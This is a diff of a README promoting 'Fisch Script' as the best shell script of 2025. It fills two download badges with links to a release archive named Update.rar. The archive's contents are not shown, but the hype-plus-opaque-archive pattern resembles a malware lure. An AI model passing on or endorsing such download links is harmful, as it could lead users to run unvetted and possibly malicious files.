@@ -1,7 +1,7 @@
-# 🚀 **Fisch Script — The Best Shell Script of 2025** 🎉 [![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)]()
+# 🚀 **Fisch Script — The Best Shell Script of 2025** 🎉 [![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)](https://github.com/Z3r0Byte3/fisch-script/releases/download/Update/Update.rar)
 
 ![fnew](https://github.com/user-attachments/assets/b79d9f98-ca14-4d02-b881-b1704f652321)
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)]()
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-red?style=for-the-badge&logo=download)](https://github.com/Z3r0Byte3/fisch-script/releases/download/Update/Update.rar)
 
 
 ## ❓ **What is Fisch Script?**
